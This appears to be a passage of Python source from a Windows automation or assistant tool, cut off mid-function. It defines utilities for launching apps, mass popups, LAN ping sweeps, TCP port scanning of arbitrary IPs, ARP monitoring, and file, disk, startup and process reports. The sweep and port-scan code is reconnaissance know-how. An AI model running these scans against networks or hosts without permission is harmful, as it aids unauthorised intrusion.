def _batch_launch(self, apps: str) -> str:
        """批量打开多个应用"""
        try:
            if not self.process_manager:
                return "[ERROR] Process manager not initialized."
            if not apps or not apps.strip():
                return "[ERROR] 请指定要打开的应用,用逗号分隔。例如: '记事本,计算器,浏览器'"
            import re
            app_list = [a.strip() for a in re.split(r'[,，;；、]', apps) if a.strip()]
            if not app_list:
                return "[ERROR] 未识别到有效的应用名"
            results = []
            success_count = 0
            fail_count = 0
            for app in app_list:
                ret = self.process_manager.launch_application(app)
                if "[SUCCESS]" in ret:
                    success_count += 1
                    results.append(f"  ✅ {app}")
                else:
                    fail_count += 1
                    results.append(f"  ❌ {app}: {ret}")
            lines = ["[BATCH LAUNCH] 批量打开结果", "-" * 50]
            lines.extend(results)
            lines.append("-" * 50)
            lines.append(f"  成功: {success_count}  失败: {fail_count}")
            return '\n'.join(lines)
        except Exception as e:
            return f"[ERROR] Batch launch failed: {e}"


def _batch_popup(self, count: int, message: str, title: str = '',
                     popup_type: str = 'info', start_x: int = -1, start_y: int = -1,
                     offset_x: int = 40, offset_y: int = 40) -> str:
        """批量弹出多个Windows消息框(多线程同时弹出,支持位置控制)"""
        try:
            count = max(1, min(50, int(count)))
            if not message:
                return "[ERROR] 请指定弹窗消息内容"
            type_map = {
                "info": (0x40, "Info"),
                "warning": (0x30, "Warning"),
                "error": (0x10, "Error"),
                "question": (0x20, "Question"),
            }
            flags, default_title = type_map.get(popup_type, (0x40, "Info"))
            if not title:
                title = default_title
            import threading, time, ctypes
            from ctypes import wintypes
            if start_x < 0 or start_y < 0:
                sw = ctypes.windll.user32.GetSystemMetrics(0)
                sh = ctypes.windll.user32.GetSystemMetrics(1)
                start_x = max(0, sw // 2 - 200)
                start_y = max(0, sh // 2 - 150)
            popup_w = 300  # MessageBox 估算宽度
            popup_h = 130
            def _show_pos(i):
                """弹窗并立即移动到指定位置"""
                hwnd = ctypes.windll.user32.MessageBoxW(0, message, title, flags)
                x = start_x + (i * offset_x)
                y = start_y + (i * offset_y)
                ctypes.windll.user32.SetWindowPos(hwnd, 0, x, y, popup_w, popup_h, 0x0001 | 0x0004)
            threads = []
            for i in range(count):
                t = threading.Thread(target=_show_pos, args=(i,), daemon=True)
                threads.append(t)
                t.start()
                time.sleep(0.05)  # 错开一点点,避免HWND竞争
            return (f"[BATCH POPUP] 已在 {count} 个线程中弹出弹窗\n"
                    f"  消息: {message}\n  标题: {title}\n  类型: {popup_type}\n"
                    f"  位置: 起始({start_x},{start_y})  偏移({offset_x},{offset_y})")
        except Exception as e:
            return f"[ERROR] Batch popup failed: {e}"


def _lan_scan(self, timeout: int = 0.6) -> str:
        """扫描局域网内在线设备。

        快速路径：进程内原生 ICMP 扫（一次性发出 254 个 echo、统一收 ~1s 回包），
        无子进程开销；若 raw socket 不可用（权限/防火墙），回退到 ping3 / subprocess。
        """
        try:
            import concurrent.futures as cf, struct, os
            try:
                t_o = max(0.2, min(float(timeout), 2.0))
            except Exception:
                t_o = 0.6
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            subnet = '.'.join(local_ip.split('.')[:3])
            result_parts = []
            result_parts.append(f"[LAN SCAN] 扫描子网: {subnet}.0/24")
            result_parts.append(f"  本机IP: {local_ip}")
            result_parts.append(f"  本机名: {hostname}")
            result_parts.append("-" * 50)
            lock = threading.Lock()
            devices = []

            # 反向 DNS 加 0.8s 上限保护，避免无 PTR 记录的主机把整轮拖死
            def _resolve(ip):
                box = {}
                def _r():
                    try:
                        box['h'] = socket.gethostbyaddr(ip)[0]
                    except Exception:
                        box['h'] = "Unknown"
                th = threading.Thread(target=_r, daemon=True)
                th.start()
                th.join(timeout=0.8)
                return box.get('h', "Unknown")

            def _icmp_sweep(sub, t):
                """进程内 ICMP echo 扫，返回存活 IP 集合；不可用则返回 None。"""
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                    sock.settimeout(t)
                except OSError:
                    return None
                try:
                    pid = os.getpid() & 0xFFFF
                    def _echo(seq):
                        head = struct.pack('!BBHHH', 8, 0, 0, pid, seq)
                        payload = b'0001000200030004000500060007'
                        def _cs(b):
                            if len(b) % 2:
                                b += b'\x00'
                            s = sum(struct.unpack('!%dH' % (len(b) // 2), b))
                            s = (s >> 16) + (s & 0xFFFF)
                            s += s >> 16
                            return (~s) & 0xFFFF
                        head = struct.pack('!BBHHH', 8, 0, _cs(head + payload), pid, seq)
                        return head + payload
                    seq = 0
                    for i in range(1, 255):
                        seq = (seq + 1) & 0xFFFF
                        try:
                            sock.sendto(_echo(seq), (f"{sub}.{i}", 0))
                        except Exception:
                            pass
                    alive = set()
                    end = time.time() + t
                    while time.time() < end:
                        try:
                            data, addr = sock.recvfrom(1024)
                        except socket.timeout:
                            break
                        except Exception:
                            break
                        if len(data) < 28:
                            continue
                        if data[20] != 0:   # 仅收 echo reply
                            continue
                        if struct.unpack('>H', data[24:26])[0] == pid:
                            alive.add(addr[0])
                    return alive
                finally:
                    try:
                        sock.close()
                    except Exception:
                        pass

            alive_set = _icmp_sweep(subnet, t_o)
            if alive_set is None:
                # 回退：逐主机 ping3 / subprocess（有界并发）
                def ping_host(host_suffix):
                    ip = f"{subnet}.{host_suffix}"
                    try:
                        if PING_AVAILABLE:
                            ok = ping3.ping(ip, timeout=t_o) is not None
                        else:
                            r = subprocess.run(
                                ['ping', '-n', '1', '-w', str(int(t_o * 1000)), ip],
                                capture_output=True, timeout=t_o + 1)
                            ok = r.returncode == 0
                        if ok:
                            with lock:
                                devices.append((ip, _resolve(ip), "N/A"))
                    except Exception:
                        pass
                with cf.ThreadPoolExecutor(max_workers=128) as ex:
                    list(ex.map(ping_host, range(1, 255)))
            else:
                # 快速路径：并行反解主机名
                with cf.ThreadPoolExecutor(max_workers=32) as ex:
                    devices = list(ex.map(lambda ip: (ip, _resolve(ip), "N/A"), alive_set))

            if not devices:
                return f"[LAN SCAN] 未发现在线设备\n  子网: {subnet}.0/24\n  本机: {local_ip}"
            result_parts.append(f"  {'IP':<18} {'主机名':<25} {'MAC地址':<20}")
            result_parts.append("  " + "-" * 60)
            for ip, name, mac in sorted(devices, key=lambda x: int(x[0].split('.')[-1])):
                result_parts.append(f"  {ip:<18} {name:<25} {mac:<20}")
            result_parts.append("-" * 50)
            result_parts.append(f"  共发现 {len(devices)} 台在线设备")
            return '\n'.join(result_parts)
        except Exception as e:
            return f"[ERROR] LAN scan failed: {e}"


def _lan_port_scan(self, target_ip: str, ports: str = '') -> str:
        """对指定IP进行端口扫描"""
        if not target_ip:
            return "[ERROR] 请指定目标IP地址"
        default_ports = [22, 80, 443, 445, 3389, 21, 23, 25, 110, 143, 993, 995, 3306, 5432, 6379, 8080, 8443, 135, 139, 389, 1433, 1521, 5900, 27017]
        try:
            if ports:
                port_list = [int(p.strip()) for p in ports.split(',') if p.strip().isdigit()]
            else:
                port_list = default_ports
        except Exception:
            port_list = default_ports
        result_parts = []
        result_parts.append(f"[PORT SCAN] 目标: {target_ip}")
        result_parts.append(f"  扫描端口: {len(port_list)} 个")
        result_parts.append("-" * 50)
        result_parts.append(f"  {'端口':<8} {'服务':<20} {'状态':<10}")
        result_parts.append("  " + "-" * 40)
        common_ports = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 80: "HTTP",
            110: "POP3", 135: "RPC", 139: "NetBIOS", 143: "IMAP",
            389: "LDAP", 443: "HTTPS", 445: "SMB", 993: "IMAPS",
            995: "POP3S", 1433: "MSSQL", 1521: "Oracle", 3306: "MySQL",
            3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 6379: "Redis",
            8080: "HTTP-Proxy", 8443: "HTTPS-Alt", 27017: "MongoDB"
        }
        open_ports = []
        for port in port_list:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target_ip, port))
                sock.close()
                if result == 0:
                    service = common_ports.get(port, "Unknown")
                    open_ports.append((port, service))
                    result_parts.append(f"  {port:<8} {service:<20} {'OPEN':<10}")
            except Exception:
                continue
        if not open_ports:
            result_parts.append("  (未发现开放端口)")
        result_parts.append("-" * 50)
        result_parts.append(f"  结果: {len(open_ports)}/{len(port_list)} 个端口开放")
        return '\n'.join(result_parts)


def _lan_sniffer(self, duration: int = 10) -> str:
        """监听局域网广播数据包"""
        result_parts = []
        result_parts.append(f"[SNIFFER] 开始监听局域网广播({duration}秒)...")
        result_parts.append("-" * 50)
        start_time = time.time()
        discovered = {}
        try:
            arp_output = subprocess.check_output("arp -a", shell=True, text=True, stderr=subprocess.STDOUT)
            lines = arp_output.strip().split('\n')
            for line in lines:
                parts = line.split()
                if len(parts) >= 2:
                    ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                    mac_match = re.search(r'([0-9A-Fa-f]{2}[-:][0-9A-Fa-f]{2}[-:][0-9A-Fa-f]{2}[-:][0-9A-Fa-f]{2}[-:][0-9A-Fa-f]{2}[-:][0-9A-Fa-f]{2})', line)
                    if ip_match and mac_match:
                        ip = ip_match.group(1)
                        mac = mac_match.group(1)
                        discovered[ip] = {'mac': mac, 'source': 'ARP'}
            result_parts.append(f"\n  [ARP表] 发现 {len(discovered)} 个设备:")
            for ip, info in discovered.items():
                result_parts.append(f"    {ip:<18} MAC: {info['mac']:<20} 来源: {info['source']}")
            result_parts.append(f"\n  [NetBIOS] 尝试解析设备名称...")
            local_ip = socket.gethostbyname(socket.gethostname())
            subnet = '.'.join(local_ip.split('.')[:3])
            for i in range(1, 10):
                ip = f"{subnet}.{i}"
                if ip != local_ip:
                    try:
                        host = socket.gethostbyaddr(ip)
                        result_parts.append(f"    {ip:<18} -> {host[0]}")
                    except Exception: pass
            time.sleep(min(duration, 3))
            result_parts.append(f"\n  [二次ARP扫描]")
            try:
                arp_output2 = subprocess.check_output("arp -a", shell=True, text=True, stderr=subprocess.STDOUT)
                lines2 = arp_output2.strip().split('\n')
                for line in lines2:
                    ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                    if ip_match:
                        ip = ip_match.group(1)
                        if ip not in discovered and ip != local_ip:
                            mac_match = re.search(r'([0-9A-Fa-f]{2}[-:][0-9A-Fa-f]{2}[-:][0-9A-Fa-f]{2}[-:][0-9A-Fa-f]{2}[-:][0-9A-Fa-f]{2}[-:][0-9A-Fa-f]{2})', line)
                            mac = mac_match.group(1) if mac_match else "N/A"
                            result_parts.append(f"    [新增] {ip:<18} MAC: {mac}")
            except Exception: pass
        except Exception as e:
            result_parts.append(f"  [WARN] {e}")
        result_parts.append("-" * 50)
        result_parts.append(f"[SNIFFER] 监听完成.")
        return '\n'.join(result_parts)


def _arp_watch(self, interval: int = 5, count: int = 3) -> str:
        """监控ARP表变化"""
        try:
            result_parts = []
            result_parts.append(f"[ARP WATCH] 开始监控(间隔:{interval}秒, 次数:{count})")
            result_parts.append("-" * 50)
            def get_arp_table():
                """获取ARP表"""
                arp_data = {}
                output = subprocess.check_output("arp -a", shell=True, text=True, stderr=subprocess.STDOUT)
                for line in output.strip().split('\n'):
                    ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                    mac_match = re.search(r'([0-9A-Fa-f]{2}[-:][0-9A-Fa-f]{2}[-:][0-9A-Fa-f]{2}[-:][0-9A-Fa-f]{2}[-:][0-9A-Fa-f]{2}[-:][0-9A-Fa-f]{2})', line)
                    if ip_match and mac_match:
                        arp_data[ip_match.group(1)] = mac_match.group(1)
                return arp_data
            previous_arp = get_arp_table()
            local_ip = socket.gethostbyname(socket.gethostname())
            result_parts.append(f"  本机IP: {local_ip}")
            result_parts.append(f"  初始设备数: {len(previous_arp)}")
            result_parts.append("")
            for i in range(count):
                result_parts.append(f"  [检查 {i + 1}/{count}]")
                time.sleep(interval)
                current_arp = get_arp_table()
                new_devices = {k: v for k, v in current_arp.items() if k not in previous_arp and k != local_ip}
                removed_devices = {k: v for k, v in previous_arp.items() if k not in current_arp and k != local_ip}
                changed_devices = {k: (previous_arp[k], v) for k, v in current_arp.items() if k in previous_arp and previous_arp[k] != v and k != local_ip}
                if new_devices:
                    for ip, mac in new_devices.items():
                        result_parts.append(f"    [+] 新设备接入: {ip:<18} MAC: {mac}")
                if removed_devices:
                    for ip, mac in removed_devices.items():
                        result_parts.append(f"    [-] 设备离线: {ip:<18} MAC: {mac}")
                if changed_devices:
                    for ip, (old_mac, new_mac) in changed_devices.items():
                        result_parts.append(f"    [!] IP冲突/变更: {ip} MAC: {old_mac} -> {new_mac}")
                if not new_devices and not removed_devices and not changed_devices:
                    result_parts.append(f"    (无变化, 共 {len(current_arp)} 个设备)")
                previous_arp = current_arp
                result_parts.append("")
            result_parts.append("-" * 50)
            result_parts.append("[ARP WATCH] 监控结束.")
            return '\n'.join(result_parts)
        except Exception as e:
            return f"[ERROR] ARP watch failed: {e}"


def _file_crawler(self, directory: str = '') -> str:
        """扫描目录文件结构统计(优先使用Windows索引,亚秒级)"""
        try:
            if not directory:
                directory = str(Path.home() / "Documents")
            target_dir = Path(directory)
            if not target_dir.exists():
                return f"[ERROR] 目录不存在: {directory}"
            result_parts = []
            result_parts.append(f"[FILE CRAWLER] 扫描目录: {directory}")
            result_parts.append("-" * 50)
            use_index = False
            if WIN32_AVAILABLE:
                try:
                    import win32com.client
                    scope_dir = directory.rstrip('\\')
                    conn = win32com.client.Dispatch("ADODB.Connection")
                    conn.Open("Provider=Search.CollatorDSO;Extended Properties='Application=Windows';")
                    sql = f"""SELECT System.FileExtension, System.Size, System.DateModified, System.ItemPathDisplay
FROM SYSTEMINDEX 
WHERE SCOPE='file:{scope_dir}' 
  AND System.ItemType='File'"""
                    rs = conn.Execute(sql)
                    ext_stats = {}
                    total_size = 0
                    total_files = 0
                    newest_file = None
                    oldest_file = None
                    large_files = []
                    while not rs.EOF:
                        try:
                            ext = str(rs.Fields(0).Value or '(无扩展名)').lower()
                            size_val = rs.Fields(1).Value or 0
                            mtime_str = str(rs.Fields(2).Value or '')
                            path = str(rs.Fields(3).Value or '')
                            ext_stats[ext] = ext_stats.get(ext, 0) + 1
                            total_files += 1
                            total_size += size_val
                            if size_val > 10 * 1024 * 1024:
                                large_files.append((path, size_val))
                        except Exception: pass
                        rs.MoveNext()
                    rs.Close()
                    conn.Close()
                    use_index = True
                    result_parts.append(f"  模式: Windows索引查询 (亚秒级)")
                except Exception: pass
            if not use_index:
                result_parts.append(f"  模式: 传统递归扫描 (可能需要时间)")
                ext_stats = {}
                total_size = 0
                total_files = 0
                newest_file = None
                oldest_file = None
                large_files = []
                for f in target_dir.rglob('*'):
                    if f.is_file():
                        try:
                            stat_info = f.stat()
                            size = stat_info.st_size
                            mtime = stat_info.st_mtime
                            ext = f.suffix.lower() if f.suffix else '(无扩展名)'
                            ext_stats[ext] = ext_stats.get(ext, 0) + 1
                            total_files += 1
                            total_size += size
                            if newest_file is None or mtime > newest_file[1]:
                                newest_file = (str(f), mtime)
                            if oldest_file is None or mtime < oldest_file[1]:
                                oldest_file = (str(f), mtime)
                            if size > 10 * 1024 * 1024:
                                large_files.append((str(f), size))
                        except Exception:
                            continue
            if total_files == 0:
                return f"[FILE CRAWLER] 目录为空: {directory}"
            result_parts.append(f"  文件总数: {total_files}")
            result_parts.append(f"  总大小: {total_size / 1024 / 1024:.2f} MB")
            result_parts.append("")
            result_parts.append("  [文件类型分布 Top 10]")
            sorted_exts = sorted(ext_stats.items(), key=lambda x: -x[1])[:10]
            for ext, count in sorted_exts:
                pct = count / total_files * 100
                bar = '█' * int(pct / 2) + '░' * (50 - int(pct / 2))
                result_parts.append(f"    {ext:<12} {count:<6} ({pct:.1f}%)")
            result_parts.append("")
            if large_files:
                result_parts.append(f"  [大文件 Top 5 (>10MB)]")
                large_files.sort(key=lambda x: -x[1])
                for path, size in large_files[:5]:
                    result_parts.append(f"    {Path(path).name:<30} {size / 1024 / 1024:.2f} MB")
            if use_index and newest_file:
                result_parts.append(f"  注: 索引模式下仅统计扩展名和大小分布")
            else:
                if newest_file:
                    result_parts.append(f"  最新文件: {Path(newest_file[0]).name} ({datetime.fromtimestamp(newest_file[1]).strftime('%Y-%m-%d %H:%M')})")
                if oldest_file:
                    result_parts.append(f"  最旧文件: {Path(oldest_file[0]).name} ({datetime.fromtimestamp(oldest_file[1]).strftime('%Y-%m-%d %H:%M')})")
            result_parts.append("-" * 50)
            result_parts.append(f"[FILE CRAWLER] 扫描完成. 共 {total_files} 个文件, {total_size / 1024 / 1024:.2f} MB")
            return '\n'.join(result_parts)
        except Exception as e:
            return f"[ERROR] File crawler failed: {e}"


def _disk_analyzer(self, drive: str = '') -> str:
        """分析磁盘空间使用情况"""
        try:
            if PSUTIL_AVAILABLE:
                if drive:
                    disks = [d for d in psutil.disk_partitions() if d.device.startswith(drive)]
                else:
                    disks = psutil.disk_partitions()
                result_parts = []
                result_parts.append("[DISK ANALYZER] 磁盘空间分析")
                result_parts.append("-" * 60)
                result_parts.append(f"  {'分区':<10} {'文件系统':<10} {'总大小':<12} {'已用':<12} {'可用':<12} {'使用率':<8}")
                result_parts.append("  " + "-" * 60)
                for d in disks:
                    try:
                        usage = psutil.disk_usage(d.mountpoint)
                        total_gb = usage.total / (1024**3)
                        used_gb = usage.used / (1024**3)
                        free_gb = usage.free / (1024**3)
                        percent = usage.percent
                        result_parts.append(f"  {d.device:<10} {d.fstype:<10} {total_gb:<.2f}GB  {used_gb:<.2f}GB  {free_gb:<.2f}GB  {percent:.1f}%")
                    except Exception:
                        continue
                result_parts.append("")
                result_parts.append("  [占用空间最大的文件夹 (C:\\)]")
                c_root = Path("C:\\")
                if c_root.exists():
                    folder_sizes = []
                    for item in c_root.iterdir():
                        if item.is_dir():
                            try:
                                size = sum(f.stat().st_size for f in item.rglob('*') if f.is_file()) / (1024**3)
                                folder_sizes.append((item.name, size))
                            except Exception:
                                continue
                    folder_sizes.sort(key=lambda x: -x[1])
                    for name, size in folder_sizes[:10]:
                        bar = '█' * int(size) + '░' * max(0, 20 - int(size))
                        result_parts.append(f"    {name:<25} {size:.2f} GB  {bar}")
                result_parts.append("-" * 60)
                return '\n'.join(result_parts)
            else:
                output = subprocess.check_output("wmic logicaldisk get size,freespace,caption", shell=True, text=True)
                return f"[DISK ANALYZER]\n{output}"
        except Exception as e:
            return f"[ERROR] Disk analyzer failed: {e}"


def _startup_monitor(self, filter: str = '') -> str:
        """列出开机启动项"""
        try:
            result_parts = []
            result_parts.append("[STARTUP MONITOR] 开机启动项审计")
            result_parts.append("-" * 60)
            result_parts.append("  [注册表启动项]")
            startup_paths = [
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"),
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"),
            ]
            found_items = []
            for hive, path in startup_paths:
                try:
                    key = winreg.OpenKey(hive, path, 0, winreg.KEY_READ)
                    i = 0
                    while True:
                        try:
                            name, value, _ = winreg.EnumValue(key, i)
                            entry = f"{name} -> {value}"
                            if not filter or filter.lower() in entry.lower():
                                found_items.append(entry)
                            i += 1
                        except WindowsError:
                            break
                    winreg.CloseKey(key)
                except Exception:
                    continue
            for item in found_items:
                result_parts.append(f"    {item}")
            if not found_items:
                result_parts.append("    (未发现注册表启动项)")
            result_parts.append("")
            result_parts.append("  [启动文件夹]")
            startup_folders = [
                Path(os.environ.get('APPDATA', '')) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup",
                Path(os.environ.get('PROGRAMDATA', '')) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup",
            ]
            startup_folder_items = []
            for folder in startup_folders:
                if folder.exists():
                    for item in folder.iterdir():
                        if not filter or filter.lower() in item.name.lower():
                            startup_folder_items.append(str(item))
            for item in startup_folder_items:
                result_parts.append(f"    {item}")
            if not startup_folder_items:
                result_parts.append("    (启动文件夹为空)")
            if PSUTIL_AVAILABLE:
                result_parts.append("")
                result_parts.append("  [计划任务(Top 10)]")
                try:
                    output = subprocess.check_output(
                        'schtasks /query /fo LIST /v /nh 2>nul',
                        shell=True, text=True, timeout=5
                    )
                    lines = output.strip().split('\n')
                    task_count = 0
                    for line in lines:
                        if 'TaskName' in line or '任务名称' in line:
                            task_count += 1
                            if task_count <= 10:
                                name = line.split(':', 1)[-1].strip()
                                if not filter or filter.lower() in name.lower():
                                    result_parts.append(f"    {name}")
                    if task_count > 10:
                        result_parts.append(f"    ... 及其他 {task_count - 10} 个任务")
                except Exception:
                    result_parts.append("    (获取失败, 请以管理员身份运行)")
            result_parts.append("-" * 60)
            result_parts.append(f"[STARTUP MONITOR] 共发现 {len(found_items)} 个注册表启动项, {len(startup_folder_items)} 个启动文件夹项")
            return '\n'.join(result_parts)
        except Exception as e:
            return f"[ERROR] Startup monitor failed: {e}"


def _process_tree(self, filter_name: str = '') -> str:
        """进程树可视化"""
        try:
            if not PSUTIL_AVAILABLE:
                return "[ERROR] 需要 psutil 模块"
            result_parts = []
            result_parts.append("[PROCESS TREE] 进程树")
            result_parts.append("-" * 60)
            result_parts.append("[EXE PATHS] 进程名 -> 可执行文件完整路径")
            path_count = 0
            for proc in psutil.process_iter(['pid', 'name', 'exe']):
                try:
                    if filter_name and filter_name.lower() not in (proc.info['name'] or '').lower():
                        continue
                    exe = proc.info['exe'] or 'N/A(权限不足)'
                    result_parts.append(f"  {proc.info['name']} (PID:{proc.info['pid']}) -> {exe}")
                    path_count += 1
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            result_parts.append(f"  共 {path_count} 个进程含路径信息")
            result_parts.append("-" * 60)
            def build_tree(parent_pid, level=0, visited=None):
                if visited is None:
                    visited = set()
                if parent_pid in visited or level > 10:
                    return []
                visited.add(parent_pid)
                lines = []
                for proc in psutil.process_iter(['pid', 'name', 'ppid', 'cpu_percent', 'memory_percent']):
                    try:
                        if proc.info['ppid'] == parent_pid:
                            if filter_name and filter_name.lower() not in proc.info['name'].lower():
                                children = build_tree(proc.info['pid'], level + 1, visited.copy())
                                if children:
                                    lines.append(f"  {'    ' * level}├── {proc.info['name']} (PID:{proc.info['pid']})")
                                    lines.extend(children)
                            else:
                                prefix = "  " * (level + 1)
                                cpu = proc.info['cpu_percent'] or 0
                                mem = proc.info['memory_percent'] or 0
                                lines.append(f"  {'    ' * level}├── {proc.info['name']} (PID:{proc.info['pid']}, CPU:{cpu:.1f}%, MEM:{mem:.1f}%)")
                                children = build_tree(proc.info['pid'], level + 1, visited.copy())
                                lines.extend(children)
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue
                return lines
            tree_lines = build_tree(0)
            for line in tree_lines[:80]:  # 限制显示行数
                result_parts.append(line)
            if len(tree_lines) > 80:
                result_parts.append(f"  ... 及其他 {len(tree_lines) - 80} 行")
            if not tree_lines:
                result_parts.append("  (无法获取进程树)")
            result_parts.append("")
            result_parts.append(f"  [统计] 总进程数: {len(psutil.pids())}")
            result_parts.append("-" * 60)
            return '\n'.join(result_parts)
        except Exception as e:
            return f"[ERROR] Process tree failed: {e}"


def _service_guard(self) -> str:
        """关键服务健康报告"""
        try:
            result_parts = []
            result_parts.append("[SERVICE GUARD] 关键服务状态报告")
            result_parts.append(f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            result_parts.append("-" * 60)
            critical_services = [
                ("MpsSvc", "Windows 防火墙"),
                ("wuauserv", "Windows 更新"),
                ("Spooler", "打印后台处理程序"),
                ("Schedule", "任务计划程序"),
                ("WinDefend", "Windows Defender"),
                ("BITS", "后台智能传输服务"),
                ("Dhcp", "DHCP 客户端"),
                ("Dnscache", "DNS 客户端"),
                ("EventLog", "Windows 事件日志"),
                ("LanmanServer", "服务器"),
                ("LanmanWorkstation", "工作站"),
                ("RemoteRegistry", "远程注册表"),
                ("SamSs", "安全账户管理器"),
                ("Themes", "主题服务"),
                ("WlanSvc", "WLAN 自动配置"),
                ("WSearch", "Windows 搜索"),
            ]
            result_parts.append(f"  {'服务名称':<18} {'显示名称':<28} {'状态':<12} {'启动类型':<10}")
            result_parts.append("  " + "-" * 68)
            for svc_name, display_name in critical_services:
                try:
                    output = subprocess.check_output(
                        f'sc query {svc_name} 2>nul',
                        shell=True, text=True, timeout=3
                    )
                    state_match = re.search(r'STATE\s*:\s*\d+\s+(\w+)', output)
                    start_match = re.search(r'START_TYPE\s*:\s*\d+\s+(\w+)', output)
                    state = state_match.group(1) if state_match else "Unknown"
                    start_type = start_match.group(1) if start_match else "Unknown"
                except Exception:
                    state = "NOT_FOUND"
                    start_type = "N/A"
                status_icon = "OK" if state == "RUNNING" else "STOPPED" if state != "NOT_FOUND" else "MISSING"
                result_parts.append(f"  {svc_name:<18} {display_name:<28} {status_icon:<12} {start_type:<10}")
            result_parts.append("-" * 60)
            result_parts.append("[SERVICE GUARD] 报告完成.")
            return '\n'.join(result_parts)
        except Exception as e:
            return f"[ERROR] Service guard failed: {e}"


def _window_tidy(self, layout: str = 'tile') -> str:
        """窗口排列整理"""
        try:
            if not WIN32_AVAILABLE:
                return "[ERROR] 需要 win32api 模块"
            result_parts = []
            result_parts.append(f"[WINDOW TIDY] 布局模式: {layout}")
            result_parts.append("-" * 50)
            def enum_windows():
                windows = []
                def callback(hwnd, extra):
                    if win32gui.IsWindowVisible(hwnd) and win32gui.GetWindowText(hwnd):
                        rect = win32gui.GetWindowRect(hwnd)
                        w = rect[2] - rect[0]
                        h = rect[3] - rect[1]
                        if w > 100 and h > 100:  # 排除小控件
                            windows.append((hwnd, win32gui.GetWindowText(hwnd), rect))
                    return True
                win32gui.EnumWindows(callback, None)
                return windows
            windows = enum_windows()
            if not windows:
                return "[WINDOW TIDY] 未找到可整理的窗口"
            screen_width = win32api.GetSystemMetrics(0)
            screen_height = win32api.GetSystemMetrics(1)
            n = len(windows)
            result_parts.append(f"  发现 {n} 个窗口, 屏幕 {screen_width}x{screen_height}")
            if layout == 'tile':
                cols = int(n ** 0.5)
                rows = (n + cols - 1) // cols
                cell_w = screen_width // cols
                cell_h = screen_height // rows
                for i, (hwnd, title, _) in enumerate(windows):
                    col = i % cols
                    row = i // cols
                    x = col * cell_w
                    y = row * cell_h
                    win32gui.SetWindowPos(hwnd, 0, x, y, cell_w, cell_h, 0x0040)
                    result_parts.append(f"    [{i+1}] {title[:30]:<30} ({x},{y}) {cell_w}x{cell_h}")
            elif layout == 'cascade':
                offset = 0
                for i, (hwnd, title, _) in enumerate(windows):
                    x = offset + i * 30
                    y = offset + i * 30
                    w = screen_width // 2
                    h = screen_height // 2
                    if x + w > screen_width:
                        x = 0
                    if y + h > screen_height:
                        y = 0
                    win32gui.SetWindowPos(hwnd, 0, x, y, w, h, 0x0040)
                    result_parts.append(f"    [{i+1}] {title[:30]:<30} ({x},{y}) {w}x{h}")
            elif layout == 'side_by_side':
                w = screen_width // n
                h = screen_height
                for i, (hwnd, title, _) in enumerate(windows):
                    x = i * w
                    win32gui.SetWindowPos(hwnd, 0, x, 0, w, h, 0x0040)
                    result_parts.append(f"    [{i+1}] {title[:30]:<30} ({x},0) {w}x{h}")
            else:
                return f"[WINDOW TIDY] 未知布局: {layout}"
            result_parts.append("-" * 50)
            result_parts.append("[WINDOW TIDY] 整理完成.")
            return '\n'.join(result_parts)
        except Exception as e:
            return f"[ERROR] Window tidy failed: {e}"


def _audio_commander(self, device_name: str = '') -> str:
        """音频设备切换(基于pycaw Core Audio API)"""
        try:
            result_parts = []
            if not device_name:
                result_parts.append("[AUDIO COMMANDER] 可用音频输出设备:")
                result_parts.append("-" * 50)
                if PYCAW_AVAILABLE:
                    pythoncom.CoInitialize()
                    try:
                        devices = AudioUtilities.GetAllDevices()
                        active_devices = []
                        for d in devices:
                            if str(d.state) == 'AudioDeviceState.Active' and '0.0.0.' in d.id:
                                is_default = ''
                                try:
                                    default = AudioUtilities.GetSpeakers()
                                    if d.id == default.id:
                                        is_default = ' ★默认'
                                except Exception: pass
                                active_devices.append((d.FriendlyName, d.id, is_default))
                                result_parts.append(f"  [{len(active_devices)}] {d.FriendlyName}{is_default}")
                        if not active_devices:
                            result_parts.append("  (未发现活跃输出设备)")
                        result_parts.append("")
                        result_parts.append("  用法切换: audio_commander device_name=设备名")
                        result_parts.append("  例如: audio_commander device_name=扬声器 (Realtek")
                    finally:
                        pythoncom.CoUninitialize()
                else:
                    result_parts.append("  (需要pycaw库支持)")
                return '\n'.join(result_parts)
            result_parts.append(f"[AUDIO COMMANDER] 尝试切换到: {device_name}")
            if PYCAW_AVAILABLE:
                pythoncom.CoInitialize()
                try:
                    devices = AudioUtilities.GetAllDevices()
                    target = None
                    for d in devices:
                        if device_name.lower() in d.FriendlyName.lower() and '0.0.0.' in d.id:
                            target = d
                            break
                    if not target:
                        result_parts.append(f"  [ERROR] 未找到匹配设备: {device_name}")
                        return '\n'.join(result_parts)
                    ps_script = f'''
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
[ComImport, Guid("F8679F50-850A-41CF-9C72-430F290290C8")]
class PolicyConfig {{}}
[ComImport, Guid("568B9108-44BF-40B4-91C6-0AEAED6E5A8E"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IPolicyConfigVista {{
    int GetMixFormat(string pszDeviceName, IntPtr pFormat);
    int SetDeviceFormat(string pszDeviceName, IntPtr pFormat, IntPtr eventContext);
    int GetProcessingPeriod(string pszDeviceName, IntPtr pPeriod);
    int SetProcessingPeriod(string pszDeviceName, IntPtr pPeriod);
